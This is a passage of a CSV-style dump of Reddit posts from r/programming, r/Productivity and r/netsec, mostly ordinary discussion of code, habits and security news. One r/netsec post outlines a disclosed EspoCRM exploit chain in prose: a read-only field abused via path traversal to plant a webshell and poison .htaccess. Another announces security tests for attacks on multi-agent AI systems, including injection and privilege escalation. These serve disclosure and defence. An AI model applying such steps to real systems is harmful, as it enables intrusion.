+I guess those days are mostly over now, but it's nice to see that there is still some great writing going on at [InfoWorld](https://www.linkedin.com/feed/?shareActive=true&amp;url=https%3A%2F%2Fwww.infoworld.com%2Farticle%2F2335996%2F9-reasons-java-is-still-great.html&amp;shareUrl=https%3A%2F%2Fwww.infoworld.com%2Farticle%2F2335996%2F9-reasons-java-is-still-great.html#) by some talented and knowledgeable authors.
+
+
+
+[Matt Tyson](https://www.linkedin.com/feed/?shareActive=true&amp;url=https%3A%2F%2Fwww.infoworld.com%2Farticle%2F2335996%2F9-reasons-java-is-still-great.html&amp;shareUrl=https%3A%2F%2Fwww.infoworld.com%2Farticle%2F2335996%2F9-reasons-java-is-still-great.html#) is definitely one of them and this is a great piece on why despite the **#rust** / **#golang** / **#elixir** craze, **#java** is still the language and framework to beat. (One of these days I'm going to finally learn **#spring** and re-join the java club.)",0,20
+1s0rldb,2026-03-23 01:25:58,reddit,r/programming,Let's see Paul Allen's SIMD CSV parser,349,18
+1s1iqsf,2026-03-23 22:41:09,reddit,r/programming,SEVI: Silent Data Corruption of Vector Instructions in Hyper-Scale Datacenters,8,2
+1s2b2wt,2026-03-24 19:25:58,reddit,r/programming,Why so many languages have allocators now,0,5
+1s1jeoz,2026-03-23 23:05:35,reddit,r/programming,"Governance: Documentation to support projects __This is a summary of the main article, the real article goes into more details__
+
+Two weeks ago I wrote an article about governance and documentation on an organisational scale. This is the follow-up post that focuses on the project scale. You could just read this post, but it’s probably better that you start with the previous one first
+
+For me, there are four main areas to support a (large) project.
+You require the Strategy, the foundation where you start and what the idea of the project is. The Logs, these are living documents that capture what is going on. Blueprint, these are mainly diagrams to support the project visually. And finally Program Management, where you keep everything that’s related to timing and execution.
+
+### Strategy
+All of this starts with a Business Case. The “Why” we are doing this document. This can be high level, or very deep.
+
+You will also find a Kick-off document here. These are often PowerPoint slides that define the team, scope, way of working, and timelines.
+
+### Logs
+I always like to have an Open Questions Log. A centralized document (everyone has access) to questions that need answers.
+
+The Decision Log is where you keep track of the closed questions. Again, very handy in an ongoing project, but extra useful once the project is over and it all becomes part of the bigger documentation.
+
+Meeting Notes are also handy to store here, probably best in a subdirectory. AI-generated documents are actually very welcome here (compared to other AI generated documentation everywhere else)
+
+### Blueprints
+I like to keep my diagrams both in the raw format (visio, draw.io, lucid,…) and in static formats (like PNG).
+I always like to have diagrams that show both the Target and AS-IS states, and if it’s a big project, what the project phases look like
+
+### Project related documents
+I always like a Gantt Chart. Make sure it’s up-to-date and accessible to everyone. Ideally you also have the Critical Path highlighted. Also, deadlines and gates should be present. Providing a central Gantt chart ensures that project management is democratised.
+
+## The most important ones
+You pick and choose what you think is essential in the scope of the project. You can also add more later.
+
+That being said I like to always have at least the core documents. Even if it’s a project for an app that will be live for two weeks.
+
+  - The Business Case: If this isn’t clear, the architecture will drift.
+  - Decision &amp; Question Logs: These are the most valuable “historical” nodes for future maintainers.
+  - TO-BE Diagram: A quick reference for everyone on what’s actually changing. Also, easy to copy and paste into presentations for higher-ups.
+  - The Gantt: That’s just basic project management and keeps everyone honest.
+
+## Merging it back into the bigger documentation
+The diagrams can move towards the resources section with links to the applications.
+
+Going over the logs, you can remove the noise and keep the logs that are relevant to processes and applications to the logs of those processes and applications.
+
+You end up moving the rest to the archive section as a project folder. It’s very essential to not just delete here. If you have a similar project in the future, you can copy a lot of homework here.
+
+## Organic documentation
+So these are my current views on documentation. To paraphrase this article and the previous one:
+
+Small documents that are interconnected. Accessible and owned by everyone. Organically grown and mainly written from a project perspective.",2,0
+1s0kr42,2026-03-22 20:48:03,reddit,r/programming,my first patch to the linux kernel,213,11
+1s108v7,2026-03-23 07:05:18,reddit,r/programming,"Node.js worker threads are problematic, but they work great for us",30,4
+1r4r2bm,2026-02-15 01:51:20,reddit,r/Productivity,/r/productivity is being hit hard by AI generated slop + advertising spam. Please hit REPORT on this content! Please report any content that you believe is AI generated or is advertising content. This helps us a lot. Thank you!,155,43
+1s2zqqv,2026-03-25 11:29:29,reddit,r/Productivity,"Stop Time management, start doing this instead. I kept telling myself that I was “too busy” for things like deep work, fitness, and growth. I didn't know what I was doing wrong then I came across this article by Acharya Prashant on time management. It suggested it's not about time management it's value management. 
+
+I tracked every hour for a few days. And the truth hit hard:
+I was spending 2+ hours on reels.
+Another hour scrolling.  All while the important stuff got skipped. Your schedule doesn’t lie. It’s a perfect map of what you actually value. “Busy” is usually just a story we tell ourselves to avoid admitting we lack discipline. Stop saying “I don’t have time.”
+
+Start asking: “Is this important enough for me to allocate time?” Radical honesty with your own log changes everything.  I learnt this the hard way. (Do you also often think that you can't manage your time? Let me know if the advice helped.)",59,14
+1s37haj,2026-03-25 18:58:27,reddit,r/Productivity,"Why do i feel productive when im alone and unproductive when someone is with me I feel productive when im alone, I'll study better when im alone. When someone comes i lose so much motivation and become slouchy.
+I lose my productivity, i become sad, and cry?!?
+
+Does anyone know what i can do to stay productive in my everyday tasks and jobs??",13,9
+1s3aawj,2026-03-25 21:10:33,reddit,r/Productivity,"Some habits feel productive because they remove doubt and not because they build real understanding. Something I’ve learned: just because something feels clear in the moment doesn’t mean you’ve actually internalized it. I used to go over things and feel confident, but the moment I stepped away, that clarity disappeared. What felt like understanding was really just familiarity.
+
+The problem is there’s no built-in feedback and you don’t notice the gaps until you actually need to rely on what you thought you knew.
+
+If you don’t actively check whether you can recall or apply something without looking at it, that uncertainty always comes back… usually when it matters most.",3,6
+1s2yhml,2026-03-25 10:30:47,reddit,r/Productivity,"Why do I work more when Im off the clock? 
+Ive worked two jobs for almost 5yr now. Im tired. Im burnt out. I work 7d/wk. Multiple times a week I'll end up working both my FT &amp; PT job in the same day. My FT job is M-F corp with a few wfh days a week. My issue is with job1 and that I dick around and feel like I get next to nothing done some days. Im good at my job, I just dont do it sometimes. But the moment I log off Im more ready to work. I even take my laptop to my other job and I'll work off the clock and get a head start on the next day. Also before and after my shifts at my second job on the weekends too. I just...work? A part of me feels like its the pressure and perhaps my way of dealing with how robbed of time and money my life is. Like fuck you, pay me now and I'll do it on my own time. It'll get done, but not between the hours of 9-5. Does anyone else experience this motivation outside of work hours and have any insight as to why it might happen? ",21,8
+1s39y8d,2026-03-25 20:56:13,reddit,r/Productivity,"How do you handle switching between different projects without losing your train of thought? This has been my biggest friction point for a while.
+
+I'm juggling 3-4 active projects at any given time, and every time I switch from one to another I spend 10-15 minutes just getting back into the right headspace. What was I working on? Where did I leave off? What context was I holding in my head?
+
+I've tried a few things - end-of-session notes, browser tabs pinned per project, blocking dedicated time per project to reduce the switching itself. They all help marginally. Nothing has fully cracked it.
+
+Part of me suspects this is just an inherent cost of working across multiple things, and no system eliminates it - you can only manage how long the ramp-up takes. But I'm also aware that's possibly just the rationalization you make when you haven't found the right system yet.
+
+What do you actually do? Looking for things people have stuck with for more than a few weeks.",3,5
+1s2n3sg,2026-03-25 03:04:37,reddit,r/Productivity,"I can't stop scrolling and it's ruining my studies and mental health 🥀 &amp;#x200B;
+
+I don’t know if anyone else deals with this, but I feel completely stuck in this loop and I hate myself for it.
+
+I try to study, but I can only focus for like 15–20 minutes. Then I pick up my phone “just for a break” and suddenly 40 minutes (or more) are gone. The worst part is, even when I understand what I’m studying, I still feel like “oh it’s easy, I’ll just scroll for a bit”… and then I lose control again.
+
+And when I don’t understand something, it’s even worse. I start feeling anxious, like I’m already behind, like everyone else is smarter than me and I know nothing. That feeling just pushes me straight back to my phone. I end up watching random videos or “motivational” stuff that feels comforting in the moment, but I don’t actually do anything.
+
+I’ve tried the whole “5-minute break” thing, but it doesn’t work for me. Once I touch my phone, I’m gone for hours.
+
+I also feel really alone. I’m living in a PG right now and my roommate moved out, so I don’t even have someone to talk to anymore. I have friends, but not the kind I can open up to about how badly I’m struggling academically or mentally. So I just keep everything in my head and distract myself with my phone.
+
+My exams are coming up and I’ve barely studied anything. I keep thinking I’ll change, but I don’t. I’m 21 and I feel like I have no discipline, no direction, no consistency. I can’t wake up early, I can’t study for long, I get bored easily, and I don’t even know what I’m doing with my life anymore. I’m almost done with my second year and I feel like I know nothing, especially in coding.
+
+It feels like everyone else is moving forward and I’m just stuck in the same place.
+
+I don’t even know what I’m asking for… maybe advice, maybe just to know I’m not the only one like this. How do you break this cycle when your brain keeps choosing comfort over what you know you should be doing?",56,41
+1s3bgnh,2026-03-25 21:56:26,reddit,r/Productivity,"I love my husband, he’s a great dad but... Shoe sizes? Me.  
+Dentist appointments? Me.  
+Random school stuff? Also me.
+
+He helps when I ask. But I don’t want to manage help. I want him to just know too.
+
+It’s exhausting carrying all the mental load in my head 24/7.
+
+How are you all actually sharing this stuff with your partner?",1,3
+1s2nhfk,2026-03-25 03:18:01,reddit,r/Productivity,"The two minute rule changed my life I recently saw a video somewhere about a year ago about the two minute rule where you just start doing something for two minutes, and by then you'll usually just continue doing it. I started small with things like laundry, and by the time you get 2 minutes into folding laundry, stopping it seems like more work than just finishing the load. Then things like dishes, college schoolwork, etc. It seriously has changed the game because I can't argue with myself about doing just two minutes of something, even when I'm feeling super lazy. I apply it to everything now. Don't want to read before bed? 2 minutes on my Kindle. Don't want to move my body? 2 minute yoga stretch videos on yt. Don't want to study Spanish? 2 minutes on praktika. If you are having trouble starting literally anything, I highly recommend doing the 2 minute rule and seeing if it helps at all.",23,2
+1s393gz,2026-03-25 20:18:22,reddit,r/Productivity,"Do you ever feel like your system works until it suddenly doesn’t? I’ll set up a system that feels perfect at first. Everything is organized, tasks are clear, and it actually feels good to use. Then after a few weeks, it slowly starts falling apart.
+
+Things stop getting updated, tasks pile up, and I end up avoiding it.  Then I switch to something new and repeat the same cycle. Not sure if it’s just me or if systems just don’t hold up long term.",1,3
+1s1r1kn,2026-03-24 03:34:44,reddit,r/Productivity,"Why do I feel super motivated to fix my life at night, but completely lose it the next day? This has been happening to me a lot recently. Usually around midnight, I suddenly feel very clear-headed and motivated — I start planning things like fixing my sleep schedule, working out, eating better, being more productive, etc.
+
+It all feels very real in that moment, like I’ve finally figured things out.
+
+But the next day, I either feel too tired or just don’t have the same mindset at all, and I end up doing none of it. Then the cycle repeats again at night.
+
+Is there a psychological reason for this? Or is it just a discipline issue?",1481,65
+1s37c08,2026-03-25 18:50:10,reddit,r/Productivity,"Choosing when to be productive To start off, I’m a doordasher. I don’t HAVE to work when I don’t want to, I can chill at home until I’m ready to go out.
+
+I’ve made some big changes in my life recently. The gym, eating better, keeping things up at home, I’m really proud of myself for how far I’ve come in just a little less than a month. 
+
+One thing I struggle with is beating myself up about is if I have the option to work less, I’m like, I should do it anyways.
+
+Ex. Today I woke up at 4 am and couldn’t go back to sleep. Normally I would just go out and do the morning shift, my boyfriends car is broken down so that means I’d work 7:15am-10:15 am and drive back home (30 min drive) and then take him out to his class from 12-1. The evenings I make a lot more money but at least once a week I try to do morning and evening shift because the 3 hours in the morning will start me out at an extra 50-70 for the day. I’m ahead on bills, so my goal is just to make $100 a day and I can have all of my April bills paid (currently March 25) and I can easily do that in the evenings.
+
+So is it bad for me to take a morning off when I COULD go out and work?? Or am I just being too hard on myself? 
+
+TLDR: I have a hard time giving myself a break and I’m not sure about the line between discipline &amp; not allowing myself to just do “what I want” ",0,4
+1s36j7x,2026-03-25 18:04:01,reddit,r/Productivity,"Social media marketing tools that actually improved my productivity vs just added complexity Productivity focused entrepreneur here, I've tested 15+ social media marketing tools over past year. Most added complexity without improving productivity which defeats the purpose. Here's what actually helped versus what wasted my time.
+
+Tools that hurt productivity were hootsuite with too many features and overwhelming interface where I spent more time in tool than it saved. Sprout social was powerful but overkill with learning curve that killed any time savings. Multiple disconnected tools like having 6 different subscriptions created more work coordinating between them all.
+
+Tools that helped productivity started with blotato for content distribution as core workflow, only tool that genuinely saved time by automating platform-specific formatting. Create once and it distributes everywhere appropriately. Saved 8 hours weekly which is massive.
+
+Supporting tools included notion for content calendar and strategy saving 2 hours weekly. Canva for quick graphics with templates saving 3 hours weekly. Otter for voice memo transcription for content ideas saving 1 hour weekly.
+
+Total time investment before optimization was 22 hours weekly. After optimization dropped to 8 hours weekly. Time saved is 14 hours weekly for actual business work which changed everything.
+
+Key insight is productivity comes from eliminating work not just organizing it better. Most social media marketing tools just reorganize manual work into prettier interface. Find tools that actually eliminate repetitive tasks entirely.
+
+For productivity-focused people, ruthlessly evaluate if tool saves time or just creates prettier version of same work.",1,0
+1s2cucs,2026-03-24 20:50:02,reddit,r/Productivity,"How are you guys actually staying productive while working from home? I’ve been working from home for a while now and I genuinely don’t understand how people stay consistent.
+
+There’s no chaos at home, no major distractions either… but I still struggle to focus most of the time.
+
+I’ve tried fixing my routine like going to the gym, getting ready in the morning, even changing my room setup thinking it might help. It works for a bit, but then I fall back into the same cycle.
+
+In office, I never had this issue. At home, it just feels like I’m constantly fighting myself to start work.
+
+How are you all managing this? Is it just discipline or do you have some system that actually works?",48,40
+1s2kzg9,2026-03-25 01:49:50,reddit,r/Productivity,"Saving an hour of my time everyday I work remotely in operations and my mornings look like coffee, open laptop, checkinf and triage emails, pulling yesterday's metrics from 3 dashboards, compile numbers into a team update, scaning industry news for relevant stuff
+
+After all this I get time to start some work. It takes around 1 and half hour in these side tasks. 
+
+ Now I am using ai agents to help with these small tasks. Before this I thought AI was just for writing weird content that looks fake and create images and videos. But like ai agents are a different. They are not chatbots,  they kinda execute tasks on their own. Helped me with these time-consuming admin tasks that doesnt make me think AI will take my job but they do help get free 90 minutes earlier. So far been using these. 
+
+ For email triage, I tested both Lindy AI and Superhuman's AI features. Lindy is better for sorting and drafting responses. Superhuman is faster but more limited.
+
+For metrics and reports, I use Mulerun because it runs 24/7 on a dedicated machine. I set it to pull dashboard numbers and compile a daily summary by 6am. There are other ways to do this (scripts, Zapier chains) but I wanted something I could set up in plain english without coding. For news monitoring, Perplexity with a saved search works for me. 
+
+ They sometimes mess up but on average I save like around an hour of my time everyday with them. Would love more suggestions. Especially from people who work in operations. ",21,16
+1s2vd9o,2026-03-25 08:15:39,reddit,r/Productivity,"The simplest productivity hack I found was removing every decision from the capture step I spent years trying different productivity systems — Notion, Obsidian, Apple Notes, bullet journals. They all worked great for organizing. But I kept losing ideas because the capture moment had too much friction.
+
+Open the app. Pick a folder. Choose a tag. Decide if it's a new note or existing one. By that point, the thought was half gone.
+
+Eventually I stripped it down to the dumbest possible system: I email myself. One tap, type the thought, send. No decisions, no organization, just get it out of my head. I sort through everything once a day in a quick review.
+
+The lesson for me was: capture and organization are two completely different tasks. The moment you try to do both at the same time, you do neither well.
+
+Anyone else here separate their capture step from their organization step? Curious what that looks like for others.",5,3
+1s2qxo6,2026-03-25 05:23:50,reddit,r/Productivity,"Tons of free time... not sure what to do Hello all!!
+
+Im 15, and after school i really dont do much.. but i want to. Im just not sure what i want to do because i cant volunteer for things until im 16 (waiting for then so i can volunteer at an animal shelter) and there isnt much near me. I want to find a new community somewhere but its quite hard and overwhelming, because im really not sure what im into, and my age makes it much harder than youd think too. Another thing i want is for it to be active, whether its just got walking around or whether its a sport i really want to try something new and active!
+
+If you have any ideas, please let me know!! ",7,1
+1s33lb9,2026-03-25 14:59:28,reddit,r/Productivity,"How do you manage tasks if your work is mostly in Google Workspace? My work is mostly in Gmail, Docs, and Sheets, but task tracking never feels smooth.
+
+I keep trying different apps but switching tabs all the time breaks focus.
+
+How do you handle tasks / Kanban / projects without constantly jumping between tools?
+
+",1,18
+1s2vp8k,2026-03-25 08:29:46,reddit,r/Productivity,"I'm terrible at retaining information from long videos and it's driving me crazy I genuinely think I lose 2-3 hours a week just scrubbing through videos.
+
+I'll watch a long podcast, hear something that clicks, not write it down, and then 20 minutes later I'm completely lost trying to find it again. Rewind 10 seconds, nope. Rewind 30 seconds, nope. Eventually I just give up.
+
+The worst part is I *know* I do it and I still don't take notes. I've tried but I just can't get into the habit when I'm in ""consumption mode"".
+
+Curious if anyone else has this problem or if I'm just really bad at taking notes lol",3,5
+1s2snle,2026-03-25 06:29:09,reddit,r/Productivity,"Managing time (work/life) as an artist (discussion/tips) Hey, quick note, I don’t really know how to go about asking this so I’ll just do a little background and the question will be around the end. 
+
+I’m not looking for full on guides or tutorials or how I need to change my life, I just wanna hear how everyone else manages their time if they’re in a situation maybe similar to me so I can maybe get some perspective of what time management can look like if I try to change it or work on it. 
+
+So, I’m having a little trouble figuring stuff out. Figure out life pretty much, timing and fitting things in kind of thing. I’m in college and am an artist. I do my classes online and I do my art also at home/online. I last year got a job from a friend to be an animator for a mini series they’re doing, and ever since I’ve started it, I have NO sense of time anymore. 
+
+I spend maybe 10 hours or so a week on schoolwork, and I try to spend as much time as I can on the project. Mind you I also have severe attention deficit so sometimes I just sit cluelessly for hours and I can’t get myself to start anything and sometimes I burn out and have to take breaks. I feel bad because it’s already almost a year and I don’t have much work done. Some concept art, voice lines in, and a few minutes of unfinished animation. Even though my friend insists I focus on my school and I don’t push myself and there’s no deadline, I still feel bad that I’m taking so long with this. It used to be we estimated about an episode a year or so, but at this pace it’s looking like 2, maybe 3 years.
+
+TLDR, how do you guys manage your time? Manage between school, work, and free time/people? 
+
+I can’t figure out how much time is too much time when I work because I enjoy my work a lot and I enjoy being alone, but I don’t know if I work too much and I don’t spend enough time with people but at the same time I kind become upset when I don’t get anything done, then it’s another cycle of sitting for hours unable to do anything. 
+
+What do your guys’ work/life schedule look like?
+
+I can’t follow routines or schedules, but is there a better way I can plan my time or have an idea how much I need to work or not work? Again, I love doing my work, I just feel bad when I can’t fit time for everything I want/need to do and I take too long to do things.",4,6
+1s2jlo0,2026-03-25 01:01:23,reddit,r/Productivity,"Am I being lazy or am I just burned out? I work in public accounting which is known for frequent burn out and high stress, specifically during certain times of the year (“busy season”). My particular department’s busy season ended not too long ago and I went back to 40 hour work weeks from 50-60 hour work weeks (not as bad as some other firms for sure). Anyway, ever since then, I feel like my productivity has tanked
+
+I cannot concentrate on ANYTHING anymore. I literally sit at my desk and try to lock in on a task and end up just getting sidetracked and either scrolling on my phone or doing something else completely unrelated. I have tried putting my phone far away and locking down any possible distractions but the most concentration I can muster is about an hour or two before I literally just can’t anymore. I feel like my brain is just buzzing constantly with all these different thoughts and it’s seriously beginning to hinder my work.
+
+I’m falling behind on assignments and just had a conversation with my manager over something stupid that I did a few weeks ago as a result of this inability to concentrate. I’m also falling behind on household chores and just kind of letting myself go.
+
+I don’t consider myself to be this type of person normally. I’m not “Type A”, but I can usually lock in when I need to and get stuff done. Now, I can’t lock in even if I try and it’s becoming miserable. It’s like the constant pressure and flow of work during busy season kept me in a high productivity mindset and now that that’s over and I have a little bit more free time, my brain just doesn’t want to do ANYTHING.
+
+I’m just feeling confused and really exhausted and I’m not sure what to try anymore.",11,9
+1s29ccf,2026-03-24 17:50:55,reddit,r/Productivity,"simple  psychology to improve your communication I’ve been trying to improve my communication skills recently, and I noticed something interesting.
+
+About 20 days ago, I realized that even though I understand English well, I struggle when it comes to speaking clearly. So I tried a bunch of apps, but I couldn’t stick with them they felt passive and not very effective.
+
+Then I started thinking about why.
+
+Two things stood out:
+
+* We naturally learn language by listening first and then speaking, but most tools don’t focus enough on active speaking.
+* Also, people pay more attention to themselves than anything else.
+
+So I tried a simple approach:
+
+I record myself speaking and then rewatch it. While watching, I pause at certain points and compare what I said vs what I could have said better.
+
+This made the practice much more active, and I started noticing my mistakes more clearly.
+
+It’s a small change, but it’s been surprisingly effective for me. Thought I’d share in case it helps someone else trying to improve their communication.",34,7
+1s2vtrr,2026-03-25 08:35:10,reddit,r/Productivity,"how do i make myself care about exams i've been diagnosed with high functioning autism &amp; ADHD (primarily inattentive type), and i literally cannot for the life of me make myself care about tests or exams. its gotten so bad i dont even know what to do. im at the end of my 1st year of A levels, expected to send in uni applications within a few months, and yet i just can't make myself fucking care. its so terrible, i cant even describe it, i will have weeks upon weeks to study for an exam, i will be in my house rotting for literally a month straight and somehow not manage to read a single line of notes. and no, im not depressed. i'm fully chilling, giggling to myself watching videos day and night. ALL I DO IS SLEEP AND CONSUME FUCKING MEDIA. I JUST CANT MAKE MYSELF CARE. yes, i know the urgency of the situation. yes, i know im at risk of not getting into uni. yes, im scared. but THE FEAR JUST ISNT ENOUGH. like i physically CANNOT study.  i don't know how to explain this in a way that the world will understand. its not laziness. my body is INCAPABLE of doing things it doesnt find entertaining. i am actually trapped. its 5:27 in the morning right now, i have 2 final exams at 7am, i have to leave the house in like 40 mins.... and i haven't even opened a single fucking textbook. i had weeks. i haven't studied a WORD. what the fuck is wrong with me. and i dont even care. im just sitting writing this reddit post and right after that i bet every hair on the three little piggies fucking chinny chin chins that ill open up instagram reels  and go back to scrolling and reposting stupid ass videos about carrot cake and shopping, and then get up and start doing my makeup so i can look real cute to go and fail my exams. and ill be laughing about it too. this isn't fair. i didn't ask for such a useless, pathetic brain. i swear to god i am a prisoner and this is hell.",2,3
+1s2k94n,2026-03-25 01:24:10,reddit,r/Productivity,"Real-time translation during sales calls Hey,
+
+
+
+I’ll be working in a role where I need to have regular calls in a foreign language. I can communicate, but sometimes I miss words or parts of sentences, especially when people speak fast.
+
+
+
+I’m looking for some kind of setup where I can see what the other person is saying as text, and ideally have it translated into English on my screen during the call.
+
+
+
+Not to replace speaking, just as support and notes when I don’t fully catch something.
+
+
+
+Has anyone here tried something like this in real situations?
+
+
+
+Curious what actually works in practice.",6,6
+1s2f2sd,2026-03-24 22:18:25,reddit,r/Productivity,"How do you retain information from long videos and podcasts? I spend a lot of time on interviews and talks, but I forget most of it quickly. I tried notetaking, summaries, and tools, but either they break the flow or I never revisit them. Has anyone found a simple system that works?",5,34
+1qn22ig,2026-01-26 09:29:14,reddit,r/netsec,"/r/netsec's Q1 2026 Information Security Hiring Thread **Overview**
+
+If you have open positions at your company for information security professionals and would like to hire from the /r/netsec user base, please leave a comment detailing any open job listings at your company.
+
+We would also like to encourage you to post internship positions as well. Many of our readers are currently in school or are just finishing their education.
+
+Please reserve top level comments for those posting open positions.
+
+**Rules &amp; Guidelines**
+
+Include the company name in the post. If you want to be topsykret, go recruit elsewhere. Include the geographic location of the position along with the availability of relocation assistance or remote work.
+
+* If you are a third party recruiter, you must disclose this in your posting.
+* Please be thorough and upfront with the position details.
+* Use of non-hr'd (realistic) requirements is encouraged.
+* While it's fine to link to the position on your companies website, provide the important details in the comment.
+* Mention if applicants should apply officially through HR, or directly through you.
+* Please clearly list citizenship, visa, and security clearance requirements.
+
+You can see an example of acceptable posts by [perusing past hiring threads](https://www.reddit.com/r/netsec/search?q=Information+Security+Hiring+Thread&amp;sort=new&amp;restrict_sr=on).
+
+**Feedback**
+
+Feedback and suggestions are welcome, but please don't hijack this thread (use moderator mail instead.)",8,12
+1rhyn04,2026-03-01 22:29:06,reddit,r/netsec,"r/netsec monthly discussion &amp; tool thread Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.
+
+# Rules &amp; Guidelines
+
+* Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.
+* Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.
+* If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.
+* Avoid use of memes. If you have something to say, say it with real words.
+* All discussions and questions should directly relate to netsec.
+* No tech support is to be requested or provided on r/netsec.
+
+As always, the content &amp; discussion guidelines should also be observed on r/netsec.
+
+# Feedback
+
+Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.",23,36
+1s3athg,2026-03-25 21:31:12,reddit,r/netsec,"Navia breach exposed HackerOne employee PII due to a BOLA-style access in third-party system Breach occurred at Navia Benefit Solutions, a 3rd party, not HackerOne infra.
+
+Around 287 HackerOne employees PII leaked.
+
+Navia delayed breach notifications by weeks. Filed at Maine AG.
+
+Navia was independently breached. Over 10K US employee's PII exposed.
+
+Reports point to an auth flaw (BOLA-type) enabling access to employee PII (SSNs, DoB, addresses, benefits data).
+
+Exposure window: Dec 2025 to Jan 2026.",8,0
+1s39ujn,2026-03-25 20:51:52,reddit,r/netsec,"CVE-2026-33656: EspoCRM ≤ 9.3.3 — Formula engine ACL gap + path traversal → authenticated RCE (full write-up + PoC) Root cause: EspoCRM's formula engine operates outside the field-level restriction layer — fields marked readOnly (like Attachment.sourceId) are writable through it. sourceId is concatenated directly into a file path in getFilePath() with no sanitization. Chain: modify sourceId via formula → upload webshell via chunked upload → poison .htaccess → RCE as www-data. Six requests, admin credentials required. Coordinated disclosure — patched in 9.3.4.",3,1
+1s2n2bo,2026-03-25 03:03:13,reddit,r/netsec,How a Poisoned Security Scanner Became the Key to Backdooring LiteLLM,61,16
+1s36394,2026-03-25 17:37:47,reddit,r/netsec,Stackfield Desktop App: RCE via Path Traversal and Arbitrary File Write (CVE-2026-28373),2,0
+1s2pkyh,2026-03-25 04:33:53,reddit,r/netsec,Corelan: Debugging - WinDBG &amp; WinDBGX Fundamentals -,17,3
+1s2sg1n,2026-03-25 06:21:09,reddit,r/netsec,"The Age-Gated Internet: Child Safety, Identity Infrastructure, and the Not So Quiet Re-Architecting of the Web I’ve written a long-form analysis on how age-verification laws are pushing identity into internet infrastructure (OS layers, app stores, identity credentials), rather than staying at the application/content layer.
+
+It looks at how enforcement is moving “down the stack”, with governments increasingly targeting platform chokepoints like Apple/Google and device-level controls.
+
+The piece draws on UK identity history, US telecoms, and current global regulation.
+
+Curious how people here think this holds up technically, especially around enforcement, bypass (VPNs, forks, sideloading), and where this creates new attack surfaces.",10,1
+1s2f3le,2026-03-24 22:19:16,reddit,r/netsec,"We rewrote SoftHSMv2 (the default PKCS#11 software HSM) in Rust — 617+ tests, PQC support, memory-safe key handling",16,3
+1s2j0zl,2026-03-25 00:41:06,reddit,r/netsec,We scanned 900 MCP configs on GitHub. 75% had security problems.,9,0
+1s1ikju,2026-03-23 22:34:27,reddit,r/netsec,Remote Command Execution in Google Cloud with Single Directory Deletion,29,0
+1s1qhra,2026-03-24 03:15:23,reddit,r/netsec,"Vulnerability Disclosure - SCHNEIDER ELECTRIC Modicon Controllers M241 / M251 / M262 Schneider Electric has addressed two vulnerabilities disclosed by Team82 in its Modicon Controllers M241 / M251, and M262 PLC line. The vulnerabilities can allow an attacker to cause a denial-of-service condition that affects the availability of the controller.
+
+Read more on our Disclosure Dashboard: [http://claroty.com/team82/disclosure-dashboard](http://claroty.com/team82/disclosure-dashboard)
+
+Or download SE's advisory: [https://download.schneider-electric.com/files?p\_Doc\_Ref=SEVD-2026-069-01&amp;p\_enDocType=Security+and+Safety+Notice&amp;p\_File\_Name=SEVD-2026-069-01.pdf](https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2026-069-01&amp;p_enDocType=Security+and+Safety+Notice&amp;p_File_Name=SEVD-2026-069-01.pdf)",8,1
+1s1pkj6,2026-03-24 02:42:54,reddit,r/netsec,"Why Your Brain is a Security Risk Human thought is still evolving to handle the digital world. We act instinctively when we should act deliberately — and under pressure, we rarely consider all the options available to us. This article examines how we think under stress and outlines practical steps organizations can take to protect themselves
+
+",5,2
+1s2alc9,2026-03-24 19:00:42,reddit,r/netsec,Forensic Readiness Is Becoming a Strategic Security Discipline The transition from a niche practice of DFIR to the discipline of risk management and incident preparedness,0,0
+1s2cryp,2026-03-24 20:46:58,reddit,r/netsec,"With the rise of SaaS and cloud applications, the browser has become the new workplace. That's where net-security comes in.",0,0
+1s1is41,2026-03-23 22:42:32,reddit,r/netsec,"BoxPwnr: AI Agent Benchmark (HTB, TryHackMe, BSidesSF CTF 2026 etc.) A much-needed reality check for those insisting AI will automate away the need for human red teaming and pentesting. Not mentioning the costs involved.",5,3
+1s1wqjb,2026-03-24 07:05:06,reddit,r/netsec,"e open-sourced 209 security tests for multi-agent AI systems (MCP, A2A, L402/x402 protocols) Most AI security testing focuses on the model: prompt injection, jailbreaking, and output filtering. 
+
+We've been working on something different: testing the agent \*system\*. The protocols, integrations, and decision paths that determine what agents do in production. The result is a framework with 209 tests covering 4 wire protocols:
+
+\*\*MCP (Model Context Protocol)\*\* Tool invocation security: auth, injection, data leakage, tool abuse, scope creep
+
+\*\*A2A (Agent-to-Agent)\*\* Inter-agent communication: message integrity, impersonation, privilege escalation
+
+\*\*L402 (Lightning)\*\* Bitcoin-based agent payments: payment flow integrity, double-spend, authorization bypass
+
+\*\*x402 (USDC/Stablecoin)\*\* Fiat-equivalent agent payments: transaction limits, approval flows, compliance
+
+
+
+Every test maps to a specific OWASP ASI (Agentic Security Initiatives) Top 10 category. Cross-referenced with NIST AI 800-2 categories for compliance reporting.
+
+\`\`\`
+
+pip install agent-security-harness
+
+\`\`\`
+
+20+ enterprise platform adapters included (Salesforce, ServiceNow, Workday, etc.).
+
+MIT license. Feedback welcome. Especially from anyone running multi-agent systems in production. What attack vectors are we missing?
+
+
+
+",2,0
+1s1r44e,2026-03-24 03:37:18,reddit,r/netsec,"Detect SnappyClient C&amp;C Traffic Using PacketSmith + Yara-X Detection Module SnappyClient is a malware found by [Zscaler](https://www.linkedin.com/company/zscaler/) that uses a custom binary protocol (encrypted and compressed) to communicate with its C&amp;C server, with little to work with when it comes to network detection.  
+  
+At [Netomize](https://www.linkedin.com/company/netomize/), we set out to write a detection rule targeting the encrypted message packet by leveraging the unique features of PacketSmith + Yara-X detection module, and the result is documented in this blog post.",0,0
+1s0lvk9,2026-03-22 21:38:44,reddit,r/netsec,CanisterWorm Gets Teeth: TeamPCP's Kubernetes Wiper Targets Iran,27,3
+1s0dmuv,2026-03-22 13:41:45,reddit,r/netsec,"Agent skill marketplace supply chain attack: 121 skills across 7 repos vulnerable to GitHub username hijacking, 5 scanners disagree by 10x on malicious skill rates (arXiv:2603.16572)     **Submission URL**
+    : https://arxiv.org/abs/2603.16572
+    
+    **Repository hijacking**
